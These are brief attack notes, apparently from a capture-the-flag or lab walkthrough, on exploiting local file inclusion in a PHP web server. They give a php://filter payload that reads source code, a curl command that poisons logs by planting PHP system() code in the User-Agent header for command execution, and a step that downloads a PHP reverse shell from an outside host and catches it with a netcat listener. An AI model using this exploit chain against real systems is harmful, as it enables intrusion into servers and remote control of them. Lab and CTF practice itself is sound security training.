php://filter/convert.base64-encode/resource=index

We inject a php $_get variable with curl http://<IP>/ -H "user-agent: <? php system($_GET['lfi']);?>" which we use for command execution

Upload php_reverse_shell with "curl http://10.17.17.11:8000/shell.php -o shell.php", run it with nc listener to get nc reverse shell.